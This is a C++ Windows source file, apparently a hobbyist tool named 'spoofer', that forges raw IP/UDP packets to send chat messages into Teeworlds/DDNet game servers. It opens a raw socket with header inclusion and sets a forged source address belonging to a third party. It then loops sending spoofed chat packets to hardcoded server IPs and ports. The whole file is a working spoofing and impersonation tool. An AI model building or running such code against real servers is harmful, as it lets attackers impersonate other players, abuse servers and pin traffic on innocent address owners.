/* Paszczak wrote this */

// spoofer.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "winsock2.h"
#include "ws2tcpip.h" //IP_HDRINCL is here
#include "conio.h"

#pragma comment(lib,"ws2_32.lib") //winsock 2.2 library

enum
{
	PACKER_BUFFER_SIZE = 1024 * 2
};
unsigned char m_aBuffer[PACKER_BUFFER_SIZE];

unsigned char *m_pCurrent;
unsigned char *m_pEnd;
int m_Error;

unsigned char* CompressionPack(unsigned char *pDst, int i)
{
	*pDst = (i >> 25) & 0x40; // set sign bit if i<0
	i = i ^ (i >> 31); // if(i<0) i = ~i

	*pDst |= i & 0x3F; // pack 6bit into dst
	i >>= 6; // discard 6 bits
	if (i)
	{
		*pDst |= 0x80; // set extend bit
		while (1)
		{
			pDst++;
			*pDst = i&(0x7F); // pack 7bit
			i >>= 7; // discard 7 bits
			*pDst |= (i != 0) << 7; // set extend bit (may branch)
			if (!i)
				break;
		}
	}

	pDst++;
	return pDst;
}

void Reset()
{
	m_Error = 0;
	m_pCurrent = m_aBuffer;
	m_pEnd = m_pCurrent + PACKER_BUFFER_SIZE;
}

void AddInt(int i)
{
	if (m_Error)
		return;

	// make sure that we have space enough
	if (m_pEnd - m_pCurrent < 6)
	{
		m_Error = 1;
	}
	else
		m_pCurrent = CompressionPack(m_pCurrent, i);
}

void AddString(const char *pStr, int Limit)
{
	if (m_Error)
		return;

	//
	if (Limit > 0)
	{
		while (*pStr && Limit != 0)
		{
			*m_pCurrent++ = *pStr++;
			Limit--;

			if (m_pCurrent >= m_pEnd)
			{
				m_Error = 1;
				break;
			}
		}
		*m_pCurrent++ = 0;
	}
	else
	{
		while (*pStr)
		{
			*m_pCurrent++ = *pStr++;

			if (m_pCurrent >= m_pEnd)
			{
				m_Error = 1;
				break;
			}
		}
		*m_pCurrent++ = 0;
	}
}

int Size() { return (int)(m_pCurrent - m_aBuffer); }
const unsigned char *Data() { return m_aBuffer; }

unsigned char* PackHeader(unsigned char *pData, int m_Flags, int m_Size, int m_Sequence)
{
	pData[0] = ((m_Flags & 3) << 6) | ((m_Size >> 4) & 0x3f);
	pData[1] = (m_Size & 0xf);
	return pData + 2;
}

enum
{
	NETMSG_INVALID = 0,
	NETMSGTYPE_SV_MOTD,
	NETMSGTYPE_SV_BROADCAST,
	NETMSGTYPE_SV_CHAT,
	NETMSGTYPE_SV_KILLMSG,
	NETMSGTYPE_SV_SOUNDGLOBAL,
	NETMSGTYPE_SV_TUNEPARAMS,
	NETMSGTYPE_SV_EXTRAPROJECTILE,
	NETMSGTYPE_SV_READYTOENTER,
	NETMSGTYPE_SV_WEAPONPICKUP,
	NETMSGTYPE_SV_EMOTICON,
	NETMSGTYPE_SV_VOTECLEAROPTIONS,
	NETMSGTYPE_SV_VOTEOPTIONLISTADD,
	NETMSGTYPE_SV_VOTEOPTIONADD,
	NETMSGTYPE_SV_VOTEOPTIONREMOVE,
	NETMSGTYPE_SV_VOTESET,
	NETMSGTYPE_SV_VOTESTATUS,
	NETMSGTYPE_CL_SAY,
	NETMSGTYPE_CL_SETTEAM,
	NETMSGTYPE_CL_SETSPECTATORMODE,
	NETMSGTYPE_CL_STARTINFO,
	NETMSGTYPE_CL_CHANGEINFO,
	NETMSGTYPE_CL_KILL,
	NETMSGTYPE_CL_EMOTICON,
	NETMSGTYPE_CL_VOTE,
	NETMSGTYPE_CL_CALLVOTE,
	NETMSGTYPE_CL_ISDDNET,
	NETMSGTYPE_SV_DDRACETIME,
	NETMSGTYPE_SV_RECORD,
	NETMSGTYPE_SV_PLAYERTIME,
	NETMSGTYPE_SV_TEAMSSTATE,
	NETMSGTYPE_CL_SHOWOTHERS,
	NUM_NETMSGTYPES
};

#define MAX_PACKET 4096
#define MAX_MESSAGE 4086

typedef struct
{
	unsigned char IHL : 4;
	unsigned char Version : 4;
	unsigned char ECN : 2;
	unsigned char DSCP : 6;
	unsigned short Length;
	unsigned short ID;
	unsigned short FragOffset : 13;
	unsigned short Flags : 3;
	unsigned char TTL;
	unsigned char Protocol;
	unsigned short Checksum;
	unsigned int SourceIP;
	unsigned int DestIP;
} IP_HDR;

typedef struct
{
	unsigned short SourcePort;
	unsigned short DestPort;
	unsigned short Length;
	unsigned short Checksum;
} UDP_HDR;

char m_aMessage[MAX_MESSAGE];
SOCKET m_Sock;
IN_ADDR m_Addr;
SOCKADDR_IN m_Sin;

unsigned short m_Checksum;
unsigned short m_ChecksumUDP;
unsigned short m_FromPort;
unsigned short m_ToPort;

unsigned long m_FromIP;
unsigned long m_ToIP;

unsigned int m_PayloadSize;

char m_aPacket[MAX_PACKET];

void OutputPacket(char *pBuf, int Length);
void Output(char *pBuf);
bool Create(SOCKET *pSock);
void Close();
USHORT checksum(USHORT *buffer, int size);

struct psd_udp {
	struct in_addr src;
	struct in_addr dst;
	unsigned char pad;
	unsigned char proto;
	unsigned short udp_len;
	UDP_HDR udp;
};

#define BUFLEN 2048

void SendData(const char *pData, int Size)
{
	m_PayloadSize = Size;

	ZeroMemory(m_aMessage, MAX_MESSAGE);

	for (unsigned int i = 0; i < m_PayloadSize; i++)
		m_aMessage[i] = pData[i];

	IP_HDR IP;
	IP.Version = 4;
	IP.IHL = sizeof(IP_HDR) / sizeof(unsigned long);
	IP.DSCP = 0;
	IP.ECN = 1;
	IP.Length = htons(sizeof(IP_HDR) + sizeof(UDP_HDR) + m_PayloadSize);
	IP.ID = 0;
	IP.Flags = 0;
	IP.FragOffset = 0;
	IP.TTL = 128;
	IP.Protocol = IPPROTO_UDP;
	IP.Checksum = 0;
	IP.SourceIP = m_FromIP;
	IP.DestIP = m_ToIP;
	IP.Checksum = checksum((USHORT *)&IP, sizeof(IP));

	UDP_HDR UDP;
	UDP.SourcePort = m_FromPort;
	UDP.DestPort = m_ToPort;
	UDP.Length = htons(sizeof(UDP_HDR) + m_PayloadSize);
	UDP.Checksum = 0;

	char *ptr = NULL;

	m_ChecksumUDP = 0;
	ptr = m_aPacket;
	ZeroMemory(m_aPacket, MAX_PACKET);

	memcpy(ptr, &IP.SourceIP, sizeof(IP.SourceIP));
	ptr += sizeof(IP.SourceIP);
	m_ChecksumUDP += sizeof(IP.SourceIP);

	memcpy(ptr, &IP.DestIP, sizeof(IP.DestIP));
	ptr += sizeof(IP.DestIP);
	m_ChecksumUDP += sizeof(IP.DestIP);

	ptr++;
	m_ChecksumUDP++;

	memcpy(ptr, &IP.Protocol, sizeof(IP.Protocol));
	ptr += sizeof(IP.Protocol);
	m_ChecksumUDP += sizeof(IP.Protocol);

	memcpy(ptr, &UDP.Length, sizeof(UDP.Length));
	ptr += sizeof(UDP.Length);
	m_ChecksumUDP += sizeof(UDP.Length);

	memcpy(ptr, &UDP, sizeof(UDP));
	ptr += sizeof(UDP);
	m_ChecksumUDP += sizeof(UDP);

	for (unsigned int i = 0; i < m_PayloadSize; i++, ptr++)
		*ptr = m_aMessage[i];
	m_ChecksumUDP += m_PayloadSize;

	UDP.Checksum = checksum((USHORT *)m_aPacket, m_ChecksumUDP);

	ZeroMemory(m_aPacket, MAX_PACKET);
	ptr = m_aPacket;

	memcpy(ptr, &IP, sizeof(IP));
	ptr += sizeof(IP);

	memcpy(ptr, &UDP, sizeof(UDP));
	ptr += sizeof(UDP);

	memcpy(ptr, m_aMessage, m_PayloadSize);

	m_Sin.sin_family = AF_INET;
	m_Sin.sin_port = m_ToPort;
	m_Sin.sin_addr.s_addr = m_ToIP;

	int Bytes = sendto(m_Sock, m_aPacket, sizeof(IP) + sizeof(UDP) + m_PayloadSize, 0, (SOCKADDR *)&m_Sin, sizeof(m_Sin));



	/*if(Bytes != SOCKET_ERROR)
	std::cout << Bytes << " sent" << std::endl; */


}

bool Create(SOCKET *pSock)
{
	WSADATA data;
	char aBuf[1024];

	if (WSAStartup(MAKEWORD(2, 2), &data))
	{
		sprintf_s(aBuf, sizeof(aBuf), "WSAStartup() failed: %d\n", GetLastError());
		Output(aBuf);
		return false;
	}

	*pSock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_UDP, NULL, 0, 0);

	if (*pSock == INVALID_SOCKET)
	{
		sprintf_s(aBuf, sizeof(aBuf), "WSASocket() failed: %d\n", WSAGetLastError());
		Output(aBuf);
		return false;
	}

	BOOL optvalue = TRUE;

	if (setsockopt(*pSock, IPPROTO_IP, IP_HDRINCL, (char *)&optvalue, sizeof(optvalue)) == SOCKET_ERROR)
	{
		sprintf_s(aBuf, sizeof(aBuf), "setsockopt(IP_HDRINCL) failed: %d\n", WSAGetLastError());
		Output(aBuf);
		return false;
	}

	return true;
}

void Output(char *pBuf)
{
	//FILE *pFile = fopen("Sniffer.txt","a+"); 
	//fprintf(pFile,"%s", pBuf); 
	//fclose(pFile); 
	printf("%s", pBuf);
}

void Close()
{
	closesocket(m_Sock);
	WSACleanup();
	//getchar();
}

USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum = 0;

	while (size > 1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (size)
	{
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);

	return (USHORT)(~cksum);
}

int _tmain(int argc, _TCHAR* argv[])
{
	/*int srcPort = 0, dstPort = 0;
	char srcIP[256];
	char dstIP[256];

	printf("source ip:\n");

	gets_s(srcIP);

	printf("source port:\n");

	scanf_s("%d", &srcPort);

	printf("destination ip:\n");

	gets_s(dstIP);

	printf("destination port:\n");

	scanf_s("%d", &dstPort);*/

	if (!Create(&m_Sock))
		Close();

	/*char aHostname[1024];
	gethostname(aHostname, 1024);
	struct hostent *pHostent;
	pHostent = gethostbyname(aHostname);

	m_ToIP = inet_addr("92.222.22.82");
	m_ToPort = htons(8303);

	m_FromIP = /*inet_addr("1.30.158.56");inet_addr(inet_ntoa(*(struct in_addr *)*pHostent->h_addr_list));
	m_FromPort = htons(1337);*/

	m_ToIP = inet_addr("92.222.64.188");
	m_ToPort = htons(8707);

	m_FromIP = inet_addr("178.36.222.94");
	m_FromPort = htons(8002);

	char message[256];

	//start communication
	while (1)
	{
		printf("Enter message : ");
		gets_s(message);

		int Flags = 0;
		int Sequence = 0;// 0 - 1023
		int Ack = 0;

		Flags &= ~8;

		unsigned char Buffer[2048];
		int BufferSize = 0;

		Buffer[0] = ((Flags << 4) & 0xf0) | ((Ack >> 8) & 0xf);
		Buffer[1] = Ack & 0xff;
		Buffer[2] = 1;//--ChunkNum

		BufferSize += 3;

		//space for the header

		BufferSize += 2;

		Reset();
		AddInt(NETMSGTYPE_CL_SAY); //--packet id
		AddInt(0); //--team
		AddString(message, -1); //--text
		m_aBuffer[0] <<= 1; // przesuniecie packet id

		memcpy(&Buffer[BufferSize], m_aBuffer, Size());

		BufferSize += Size();

		int sizebefore = BufferSize - Size() - 2;

		printf("%d", sizebefore);

		PackHeader(&Buffer[sizebefore], 0, Size(), Sequence);

		int i;
		for (i = 0; i<BufferSize; i++)
		{
			printf("%02X", Buffer[i]);
		}

		printf("\n");

		//send the message
		SendData((const char*)Buffer, BufferSize);
	}

	Close();
	return 0;
}

